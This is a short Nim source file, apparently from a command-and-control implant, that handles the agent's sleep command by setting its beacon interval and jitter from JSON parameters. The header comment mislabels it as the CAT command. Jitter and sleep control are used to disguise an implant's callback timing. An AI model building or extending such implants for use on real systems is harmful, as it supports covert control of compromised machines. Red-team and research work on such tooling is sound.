# This is the source for the CAT command
import ../structs
import ../utils
import ../config
import json

#[
set the sleep time of the agent
  {
    "interval": 1000,
    "jitter": 12
  }

]#
proc cmd_sleep*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)

  # Configure Output
  var
    status = ""

  # Do the Magic
  try:
    let jitter = params["jitter"].getInt()
    let interval = params["interval"].getInt()

    if interval != 0:
      agent.sleepTimeMS = interval*1000
    else:
      agent.sleepTimeMS = 0
    if jitter != 0:
      agent.jitterPer = jitter

  except ValueError:
    status = "error"

  # return the response
  return buildReturnData(task.id, "", status)

